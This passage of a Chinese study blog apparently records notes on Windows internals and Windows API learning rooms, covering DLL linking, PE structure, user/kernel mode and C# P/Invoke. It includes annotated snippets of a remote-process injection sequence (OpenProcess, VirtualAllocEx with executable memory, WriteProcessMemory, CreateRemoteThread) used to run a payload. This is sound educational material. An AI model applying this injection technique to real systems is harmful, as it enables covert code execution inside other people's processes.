<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">INDLL_H</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">#ifdef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">EXPORTING_DLL</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> __declspec(dllexport) </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HelloWorld</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #C678DD">    #else</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> __declspec(dllimport) </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HelloWorld</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #C678DD">    #endif</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">#endif</span></span></code></pre></div></div></figure>
<h3 id="加载-DLL">加载 DLL</h3>
<p>DLL 可以使用<strong>加载时动态链接</strong>或<strong>运行时动态链接</strong>加载到程序中。</p>
<h4 id="加载时动态链接-load-time-dynamic-linking">加载时动态链接 load-time dynamic linking</h4>
<p>当使用<strong>加载时动态链接</strong>加载时，应用程序会显式调用 DLL 函数。只有通过提供头文件 <code>.h</code> 和导入库文件 <code>.lib</code> 才能实现这种类型的链接。下面是一个从应用程序调用导出的 DLL 函数的示例。</p>
<figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;stdafx.h&quot;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 这里显式的导入了我们的文件</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;sampleDLL.h&quot;</span></span>
<span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> APIENTRY </span><span style="color: #61AFEF">WinMain</span><span style="color: #ABB2BF">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> nCmdShow)</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">HelloWorld</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h4 id="运行时动态链接-run-time-dynamic-linking">运行时动态链接 run-time dynamic linking</h4>
<p>当使用<strong>运行时动态链接</strong>加载时，会使用一个单独的函数（<code>LoadLibrary</code> 或 <code>LoadLibraryEx</code>）在运行时加载 DLL。加载后，你需要使用<code>GetProcAddress</code> 来识别要调用的导出的 DLL 函数。下面是一个在应用程序中加载和导入 DLL 函数的示例。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">...</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 这行代码定义了一个新的函数指针类型，名为 DLLPROC。这个类型的函数指针不返回任何值（VOID），并且接受一个字符串参数（LPTSTR）</span></span>
<span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">VOID</span><span style="color: #ABB2BF"> (*</span><span style="color: #E06C75">DLLPROC</span><span style="color: #ABB2BF">) (</span><span style="color: #E5C07B">LPTSTR</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">...</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 这行声明了一个名为 HelloWorld 的函数指针变量，它的类型是我们上面定义的 DLLPROC</span></span>
<span class="line"><span style="color: #ABB2BF">DLLPROC HelloWorld;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// HINSTANCE 是一个句柄类型，用于存储加载的 DLL 模块的实例句柄。它代表了 DLL 在内存中的位置</span></span>
<span class="line"><span style="color: #ABB2BF">HINSTANCE hinstDLL;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 一个布尔变量，用于存储 FreeLibrary 函数的返回值，以检查操作是否成功</span></span>
<span class="line"><span style="color: #ABB2BF">BOOL fFreeDLL;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 加载 DLL，如果成功加载，会返回一个模块句柄给 hinstDLL，失败返回 NULL</span></span>
<span class="line"><span style="color: #ABB2BF">hinstDLL </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LoadLibrary</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;sampleDLL.dll&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (hinstDLL </span><span style="color: #C678DD">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 它在已经加载的 DLL 模块中查找并返回 HelloWorld 的内存地址。</span></span>
<span class="line"><span style="color: #ABB2BF">    HelloWorld </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (DLLPROC) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hinstDLL, </span><span style="color: #98C379">&quot;HelloWorld&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (HelloWorld </span><span style="color: #C678DD">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 调用函数指针的。它执行 HelloWorld 指针所指向的代码，也就是 sampleDLL.dll 中的 HelloWorld 函数</span></span>
<span class="line"><span style="color: #ABB2BF">        (HelloWorld);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 释放 DLL</span></span>
<span class="line"><span style="color: #ABB2BF">    fFreeDLL </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FreeLibrary</span><span style="color: #ABB2BF">(hinstDLL);</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"><span style="color: #ABB2BF">...</span></span></code></pre></div></div></figure>
<p>TBH，这个代码把我绕了一会才看懂，如果没有 C 基础的话很坐牢的，不过梳理了一下把指针又复习了一遍就解决了，就拿上面代码中的这几行来解释：</p>
<figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 这里是定义一个名字叫 DLLPROC 的“函数指针类型”</span></span>
<span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">VOID</span><span style="color: #ABB2BF"> (*</span><span style="color: #E06C75">DLLPROC</span><span style="color: #ABB2BF">) (</span><span style="color: #E5C07B">LPTSTR</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 原代码</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 这里是执行一个强制转换的功能</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 将一个通用指针的类型，安全地转换为一个特定的（DLLPROC）函数指针类型。</span></span>
<span class="line"><span style="color: #ABB2BF">HelloWorld </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (DLLPROC) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hinstDLL, </span><span style="color: #98C379">&quot;HelloWorld&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 第一种</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 编译器会抛出一个错误，告诉你“不能将一个地址解引用（dereference）为 DLLPROC 类型。”</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 这里的 * 试图解引用这个地址，尝试读取这个地址中的“值”</span></span>
<span class="line"><span style="color: #ABB2BF">HelloWorld </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(DLLPROC) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hinstDLL, </span><span style="color: #98C379">&quot;HelloWorld&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 第二种</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 不能在类型转换的括号里使用 * 符号</span></span>
<span class="line"><span style="color: #ABB2BF">HelloWorld </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">DLLPROC) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hinstDLL, </span><span style="color: #98C379">&quot;HelloWorld&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>在恶意代码中，通常会更多地使用运行时动态链接，而非加载时动态链接，但是具体的加载时动态链接案例没讲。</p>
<h2 id="Portable-Executable-Format">Portable Executable Format</h2>
<p>PE（Portable Executable，可移植可执行文件）格式是可执行文件和对象文件的总体结构。PE 和 COFF（Common Object File Format，通用对象文件格式）文件构成了 PE 格式。</p>
<img src="/thm_rthe/a2e6d40803c1d01beedd6e821de2e8d6.png" class="" title="img">
<p>PE 数据的结构的解释如下：</p>
<ol>
<li>
<p><strong>DOS 头部</strong> 定义了文件的类型，<code>MZ</code> DOS 头将文件格式定义为 <code>.exe</code>。</p>
<ol>
<li>**DOS Stub **是文件开头默认运行的一个程序，它会打印一条兼容性消息。这对于大多数用户来说不会影响文件的任何功能。当文件在旧的 DOS 系统中运行时，这个小程序会执行并打印那条经典的“This program cannot be run in DOS mode.”（本程序不能在 DOS 模式下运行）消息。在现代 Windows 系统中，这一部分会被忽略。</li>
</ol>
</li>
<li>
<p>**PE 头部（PE Header）**也叫 NT 头 <code>IMAGE_NT_HEADERS</code></p>
<ol>
<li><strong>PE 签名</strong>是一个固定的 DWORD 值 <code>0x50450000</code>（即 “PE\0\0”），用于正式标识文件为 PE 格式。</li>
<li>**文件头（File Header）**提供了二进制文件的 PE 头信息，它定义了文件的格式，包含签名和镜像文件头，目标机器类型（32 位还是 64 位）、节的数量、时间戳等。</li>
<li>**可选文件头（Optional Header）**的名称具有欺骗性，它是 <strong>PE 文件头</strong>的重要组成部分。它包含了加载器所需的最重要信息，比如程序入口点、代码和数据的基址等。
<ol>
<li>**数据目录（Data Directories）**它是可选文件头的一部分，是一个数组，数组中的每个条目都指向一个重要的数据结构，比如导入表、导出表、资源表等。</li>
</ol>
</li>
</ol>
</li>
<li>
<p>**节头部表（Section Header）**提供了每个节的元数据，比如名称、在文件中的位置、在内存中的位置、大小和权限等。</p>
</li>
<li>
<p><strong>节（Sections）<strong>是文件的</strong>实际内容</strong>。每个节都有不同的作用和权限。</p>
<table>
<thead>
<tr>
<th><strong>部分</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>.text</td>
<td>包含可执行代码和入口点</td>
</tr>
<tr>
<td>.data</td>
<td>包含已初始化数据（字符串、变量等）。</td>
</tr>
<tr>
<td>.rdata or .idata</td>
<td>包含导入（Windows API）和 DLL。</td>
</tr>
<tr>
<td>.reloc</td>
<td>包含重定位信息</td>
</tr>
<tr>
<td>.rsrc</td>
<td>包含应用程序资源（图像等）</td>
</tr>
<tr>
<td>.debug</td>
<td>包含调试信息</td>
</tr>
</tbody>
</table>
</li>
</ol>
<p>一个 <code>.exe</code> 文件是由 <strong>DOS 头 + PE 头 + 节</strong>组成的，一个标准的 PE 文件在内存中的布局是这样的：</p>
<ol>
<li><strong>DOS 头</strong> (<code>IMAGE_DOS_HEADER</code>)</li>
<li><strong>DOS 存根</strong> (<code>DOS Stub</code>)</li>
<li><strong>PE 签名</strong> (<code>PE\0\0</code>)</li>
<li><strong>NT 头</strong> (<code>IMAGE_NT_HEADERS</code>)</li>
<li><strong>节头列表</strong> (<code>IMAGE_SECTION_HEADER</code> 数组)</li>
<li><strong>节内容</strong> (<code>.text</code>, <code>.data</code> 等)</li>
</ol>
<p>想要了解更多可以看看这个文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/288382.html">PE文件结构解析</a></p>
<h2 id="Interacting-with-Windows-Internals">Interacting with Windows Internals</h2>
<p>这一节就是讲 Windows API 这些了，然后说了一下用户态和内核态这些。</p>
<p>大多数 Windows 内部组件都需要与物理硬件和内存交互，应用程序默认情况下通常无法与内核交互或修改物理硬件，并且需要一个接口实现这些。</p>
<table>
<thead>
<tr>
<th><strong>User mode</strong></th>
<th><strong>Kernel Mode</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>无法直接访问硬件</td>
<td>直接访问硬件</td>
</tr>
<tr>
<td>在私有虚拟地址空间中创建进程</td>
<td>在单个共享虚拟地址空间中运行</td>
</tr>
<tr>
<td>访问“已拥有内存位置”</td>
<td>访问整个物理内存</td>
</tr>
</tbody>
</table>
<p>在用户模式或 “userspace” 中启动的应用程序将保持在该模式。当应用程序需要执行一个只有内核才能完成的操作时（例如：读写文件、创建新进程、网络通信等），它会发出一个系统调用请求，这个系统调用就是那个“切换点”的触发器。具体流程参考下图。</p>
<img src="/thm_rthe/2e5b0c2fccd102d477752270054facb2.png" class="" title="img">
<p>当 C# 这样的语言想要调用 Win32 API 时，它不会直接调用。它的代码会先被 CLR（Common Language Runtime）接管。<strong>CLR</strong> 会负责将中间代码翻译成机器码，并且在必要的时候，<strong>由 CLR 去调用底层的 Win32 API 来与操作系统交互</strong>。</p>
<p>所以，这个过程可以看作是一个“间接”调用：<strong>你的 C# 代码 → CLR → Win32 API → 操作系统</strong></p>
<p>而不是：<strong>你的 C# 代码 → Win32 API → 操作系统</strong></p>
<p>CLR 类似 Java Runtime 这样的东西，他也是提供了一个运行时，提供了自动垃圾回收、类型安全检查等功能。</p>
<h3 id="注入弹窗到进程中">注入弹窗到进程中</h3>
<p>我们将把一个消息框注入到本地进程中，以演示与内存交互的 PoC，将消息框写入内存的步骤如下所述：</p>
<ol>
<li>为消息框分配本地进程内存。</li>
<li>将消息框写入/复制到已分配的内存中。</li>
<li>从本地进程内存执行消息框。</li>
</ol>
<p>第一步，我们可以使用 <code>OpenProcess</code> 获取指定进程的句柄。</p>
<figure class="shiki C++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre><code>// 获取一个进程的句柄
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // 定义访问的权限
	FALSE, // 目标句柄不可被继承，我们创建的子程序不带权限
	DWORD(atoi(argv[1])) // 读取用户在命令行输入的进程号，转为 int
);</code></pre></div></div></figure>
<p>第二步，我们可以使用 <code>VirtualAllocEx</code> 分配一个带有有效载荷缓冲区的内存区域。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// VirtualAllocEx 在指定进程中分配、预留或释放内存</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// remoteBuffer 存储这个新分配区域的地址</span></span>
<span class="line"><span style="color: #ABB2BF">remoteBuffer </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	hProcess,</span><span style="color: #7F848E; font-style: italic"> // 打开的目标进程的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 操作系统来决定分配内存的最佳位置</span></span>
<span class="line"><span style="color: #ABB2BF">	sizeof payload,</span><span style="color: #7F848E; font-style: italic"> // 内存分配区域的大小</span></span>
<span class="line"><span style="color: #ABB2BF">	(MEM_RESERVE </span><span style="color: #56B6C2">|</span><span style="color: #ABB2BF"> MEM_COMMIT),</span><span style="color: #7F848E; font-style: italic"> // 预留然后提交</span></span>
<span class="line"><span style="color: #ABB2BF">	PAGE_EXECUTE_READWRITE</span><span style="color: #7F848E; font-style: italic"> // 对提交区域开启执行和读写权限</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>第三步，我们可以使用 <code>WriteProcessMemory</code> 将有效载荷写入已分配的内存区域。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	hProcess,</span><span style="color: #7F848E; font-style: italic"> // 打开的目标进程的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	remoteBuffer,</span><span style="color: #7F848E; font-style: italic"> // 上一步分派的内存区域</span></span>
<span class="line"><span style="color: #ABB2BF">	payload,</span><span style="color: #7F848E; font-style: italic"> // 要写入的数据</span></span>
<span class="line"><span style="color: #ABB2BF">	sizeof payload,</span><span style="color: #7F848E; font-style: italic"> // 数据的字节大小</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #7F848E; font-style: italic"> // 不返回实际写入的字节数</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p><code> WriteProcessMemory</code>的完整函数签名是这样的：</p>
<figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">BOOL</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">( </span><span style="color: #E5C07B">HANDLE</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">hProcess</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">LPVOID</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">lpBaseAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">LPVOID</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">lpBuffer</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">SIZE_T</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">nSize</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">SIZE_T</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">lpNumberOfBytesWritten</span><span style="color: #ABB2BF"> );</span></span></code></pre></div></div></figure>
<ul>
<li><code>lpNumberOfBytesWritten</code>：这个参数是一个可选的<strong>指针</strong>。如果你传入一个有效的地址，<code>WriteProcessMemory</code> 函数会将实际写入的字节数写入到这个地址。</li>
<li><code>NULL</code>：当你传入 <code>NULL</code> 时，就表示你<strong>不关心</strong>实际写入了多少字节，你只希望函数执行写入操作。</li>
</ul>
<p>第四步，我们可以使用 <code>CreateRemoteThread</code> 从内存中执行我们的有效载荷。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// CreateRemoteThread：这个函数是 Windows API 中最经典的远程线程创建函数。它在目标进程内创建一个新的线程。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// remoteThread：一个 HANDLE 类型的变量，它将存储新创建的线程的句柄。有了这个句柄，你就可以控制这个线程，例如等待它完成或终止它。</span></span>
<span class="line"><span style="color: #ABB2BF">remoteThread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	hProcess,</span><span style="color: #7F848E; font-style: italic"> // 打开的目标进程的句柄，也就是要在哪个进程里面创建线程</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 这个参数是用来设置线程的安全属性的，传入 NULL 表示使用默认的安全描述符。</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 栈的默认大小</span></span>
<span class="line"><span style="color: #ABB2BF">	(LPTHREAD_START_ROUTINE)remoteBuffer,</span><span style="color: #7F848E; font-style: italic"> // 这是一个类型转换，它告诉 CreateRemoteThread，remoteBuffer 指向的是一个线程可以开始执行的函数。</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 这是传递给新线程的参数。如果你的注入代码（payload）需要一个参数，就会在这里传入。</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 传入 0 表示线程创建后立即开始执行。</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #7F848E; font-style: italic"> // 一个可选参数，用于接收新线程的 ID。传入 NULL 表示你不关心新线程的 ID。</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>这个房间需要一些 Windows 开发相关的知识，如果不懂那些，光靠房间本身的解释是不够的，尤其是那些方法签名。房间只给你写好了示例，但是不给你解释每个方法形参的详细作用，导致理解很困难，上面的大部分都是靠 AI 来帮忙来理解的，光记录这个房间就用了我一下午的时间，不过收获很大。</p>
<h1>Introduction to Windows API</h1>
<p>这个房间呢，则是介绍了 Windows API 的组成，和一些调用 API 的方式，总体来说是概念为主，告诉了我们大部分攻防措施都是通过 API 来实现的，比如说 Hook API 以监测 API 的调用。这个房间要对操作系统架构有一个概念性的理解，就是那个操作系统分层模型。</p>
<h2 id="Windows-API-的组成部分">Windows API 的组成部分</h2>
<p>自上而下分解 Windows API</p>
<table>
<thead>
<tr>
<th><strong>Layer</strong></th>
<th><strong>Explanation</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>API</td>
<td>一个顶层/通用术语或理论，用于描述在 win32 API 结构中找到的任何调用。</td>
</tr>
<tr>
<td>Header files or imports</td>
<td>定义了在运行时导入的库，这些库由头文件或库导入定义。使用指针获取函数地址。</td>
</tr>
<tr>
<td>Core DLLs</td>
<td>定义调用结构的四个 DLL 组。（KERNEL32、USER32 和 ADVAPI32）。这些 DLL 定义了不包含在单个子系统中的内核和用户服务。</td>
</tr>
<tr>
<td>Supplemental DLLs</td>
<td>Windows API 中定义的其他 DLL。控制 Windows 操作系统的独立子系统。约 36 个其他已定义的 DLL。（NTDLL、COM、FVEAPI 等）</td>
</tr>
<tr>
<td>Call Structures</td>
<td>定义 API 调用本身和调用的参数。</td>
</tr>
<tr>
<td>API Calls</td>
<td>程序中使用的 API 调用，其函数地址通过指针获取。</td>
</tr>
<tr>
<td>In/Out Parameters</td>
<td>由调用结构定义的参数值。</td>
</tr>
</tbody>
</table>
<h2 id="OS-Libraries-系统库">OS Libraries 系统库</h2>
<p>Win32 库的每个 API 调用都驻留在内存中，需要一个指向<strong>该函数的内存地址</strong>的指针。由于 ASLR（地址空间布局随机化），没法直接定位到这个函数，所以需要程序通过一个特定的机制去动态的定位这些函数的地址。比如说在 DLL 加载到内存后，通过 <code>GetProcAddress</code> 去查询需要的函数名，以获取他的内存地址。</p>
<h3 id="Windows-Header-File-头文件">Windows Header File 头文件</h3>
<p>微软发布了 Windows 头文件，解决因为 ASLR 获取不到 API 地址的解决方案。</p>
<p>我们在编写自己的程序中，可以导入 <code>windows.h</code> 。他包含了几乎所有 Win32 API 函数的声明、数据类型和宏定义。它告诉你的程序，像 <code>MessageBox</code>、<code>CreateRemoteThread</code> 这样的函数是存在的，以及它们的参数和返回值类型。</p>
<p>在运行时，通过操作系统提供的动态加载机制（例如 <code>LoadLibrary</code> 和 <code>GetProcAddress</code>），我们能根据函数名动态地找到它的真实地址。</p>
<h3 id="P-Invoke-机制和托管代码">P/Invoke 机制和托管代码</h3>
<p>我们之前聊过，像 C# 这样的<strong>托管代码</strong>（Managed Code）运行在 <strong>CLR</strong> (Common Language Runtime) 之下。CLR 会管理内存、提供垃圾回收，并保护你免受很多底层错误的困扰。</p>
<p>而 <strong>Win32 API</strong> 是 <strong>非托管代码</strong>（Unmanaged Code），它直接与操作系统交互，不被 CLR 管理。</p>
<p>如果你的 C# 程序想调用一个 Win32 API 函数（例如 <code>MessageBoxA</code>），它不能直接调用，因为它们属于不同的“世界”。这个过程就像你在写 C++ 代码中用到汇编代码一样（ffmpeg）。</p>
<p>下面的代码从系统运行时里面导入了 <code>InteropServices</code> 命名空间，里面有一个 <code>DllImport</code> 特性，后面会紧跟着一个<strong>函数声明</strong>，这个声明告诉运行时，在 <code>user32.dll</code> 中有一个叫 <code>MessageBox</code> 的函数，它接受一些参数，并返回一个整数。</p>
<p>只要声明之后就可以在 C# 代码中直接像调用普通方法一样调用 <code>MessageBox</code>。<code>extern</code> 关键字告诉 C# 编译器，这个函数<strong>不是在当前代码文件中实现的</strong>。</p>
<p>当你使用 <code>[DllImport]</code> 特性时，你实际上是在创建一个外部方法的声明。这个声明需要用 <code>extern</code> 关键字来修饰，因为它所指向的实际代码位于非托管的 DLL 文件中。</p>
<figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 导入了 InteropServices 命名空间，它包含了所有与托管和非托管代码交互相关的类和特性，包括 DllImport</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">InteropServices</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Program</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">	// &quot;user32.dll&quot;: 指定了我们要从哪个 DLL 文件中导入函数。user32.dll 是 Windows 操作系统的一个核心 DLL，包含了图形用户界面相关的函数，比如 MessageBox。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">	// CharSet = CharSet.Unicode: 这个参数告诉运行时，在调用非托管函数时，字符串应该使用 Unicode 字符集。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // SetLastError = true: 这是一个非常重要的参数，它告诉运行时，在调用非托管函数后，如果函数失败了，要保存 Windows 系统的错误代码。你可以通过 Marshal.GetLastWin32Error() 方法来获取这个错误代码。</span></span>
